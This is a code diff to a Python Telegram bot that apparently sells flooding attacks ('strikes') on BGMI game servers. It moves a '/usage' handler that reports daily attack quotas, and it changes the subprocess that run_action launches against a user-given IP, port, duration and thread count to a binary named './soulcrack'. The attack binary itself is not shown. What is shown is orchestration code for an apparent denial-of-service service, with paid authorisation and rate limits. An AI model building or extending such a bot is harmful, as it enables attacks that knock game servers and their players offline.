@@ -451,6 +451,33 @@ def handle_setthread(message):
             parse_mode='Markdown'
         )
 
+
+@bot.message_handler(commands=['usage'])
+def show_usage(message):
+    user_id = message.from_user.id
+    chat_type = message.chat.type
+    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
+        bot.reply_to(message, "🚫 *Warlord Pass Required!* Drop `/auth` to squad up!", parse_mode='Markdown')
+        return
+    if chat_type == 'private' or user_id in AUTHORIZED_USERS or is_authorized(user_id):
+        bot.reply_to(message, "🔥 *Unlimited BGMI Chaos!* Warlords like you don’t reload! 💪", parse_mode='Markdown')
+        return
+    now = datetime.now(kolkata_tz)
+    today = now.replace(hour=0, minute=0, second=0, microsecond=0).astimezone(pytz.utc)
+    user_usage = actions_collection.find_one(
+        {"user_id": user_id, "type": "rate_limit", "date": {"$gte": today}}
+    )
+    action_count = user_usage.get("action_count", 0) if user_usage else 0
+    remaining = RATE_LIMIT - action_count
+    bot.reply_to(message, (
+        f"📊 *Group Strike Report!* 📊\n\n"
+        f"🔫 *Fired:* `{action_count}/{RATE_LIMIT}`\n"
+        f"💣 *Ammo Left:* `{remaining if remaining > 0 else 0}`\n\n"
+        f"⏰ *Reloads:* Midnight (Asia/Kolkata)\n"
+        "🎯 *Go Warlord:* `/auth` in private for endless frags!"
+    ), parse_mode='Markdown')
+    
+
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     user_id = message.from_user.id
@@ -532,7 +559,7 @@ async def run_action(user_id, message, ip, port, duration, user_mode, chat_type)
             parse_mode="Markdown"
         )
         process = await asyncio.create_subprocess_exec(
-            "./action", ip, port, str(duration), str(thread_value),
+            "./soulcrack", ip, port, str(duration), str(thread_value),
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -599,31 +626,6 @@ def stop_all_actions(message):
             bot.reply_to(message, "⚠️ *No Strikes to Abort!* Zone’s clear!", parse_mode='Markdown')
     else:
         bot.reply_to(message, "⚠️ *No Strikes to Abort!* Nothing’s live!", parse_mode='Markdown')
-
-@bot.message_handler(commands=['usage'])
-def show_usage(message):
-    user_id = message.from_user.id
-    chat_type = message.chat.type
-    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
-        bot.reply_to(message, "🚫 *Warlord Pass Required!* Drop `/auth` to squad up!", parse_mode='Markdown')
-        return
-    if chat_type == 'private' or user_id in AUTHORIZED_USERS or is_authorized(user_id):
-        bot.reply_to(message, "🔥 *Unlimited BGMI Chaos!* Warlords like you don’t reload! 💪", parse_mode='Markdown')
-        return
-    now = datetime.now(kolkata_tz)
-    today = now.replace(hour=0, minute=0, second=0, microsecond=0).astimezone(pytz.utc)
-    user_usage = actions_collection.find_one(
-        {"user_id": user_id, "type": "rate_limit", "date": {"$gte": today}}
-    )
-    action_count = user_usage.get("action_count", 0) if user_usage else 0
-    remaining = RATE_LIMIT - action_count
-    bot.reply_to(message, (
-        f"📊 *Group Strike Report!* 📊\n\n"
-        f"🔫 *Fired:* `{action_count}/{RATE_LIMIT}`\n"
-        f"💣 *Ammo Left:* `{remaining if remaining > 0 else 0}`\n\n"
-        f"⏰ *Reloads:* Midnight (Asia/Kolkata)\n"
-        "🎯 *Go Warlord:* `/auth` in private for endless frags!"
-    ), parse_mode='Markdown')
 
 if __name__ == '__main__':
     logging.info("Starting the bot...")
